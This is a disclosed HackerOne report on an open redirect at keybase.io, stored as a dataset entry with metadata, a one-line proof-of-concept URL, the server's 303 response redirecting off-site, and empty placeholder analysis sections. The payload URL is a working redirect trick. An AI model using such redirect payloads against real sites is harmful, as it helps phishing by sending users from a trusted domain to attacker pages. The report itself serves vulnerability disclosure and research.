---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '87027'
original_report_id: '87027'
title: '[keybase.io] Open Redirect'
weakness: Open Redirect
team_handle: keybase
created_at: '2015-09-02T13:26:33.326Z'
disclosed_at: '2016-09-26T02:05:51.083Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 40
tags:
- hackerone
- open-redirect
---

# [keybase.io] Open Redirect

## Metadata

- HackerOne Report ID: 87027
- Weakness: Open Redirect
- Program: keybase
- Disclosed At: 2016-09-26T02:05:51.083Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

PoC
```
https://keybase.io//www.google.com/%2f%2e%2e
```

HTTP Response:
```
HTTP/1.1 303 See Other
...
Location: //www.google.com/%2f%2e%2e/
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
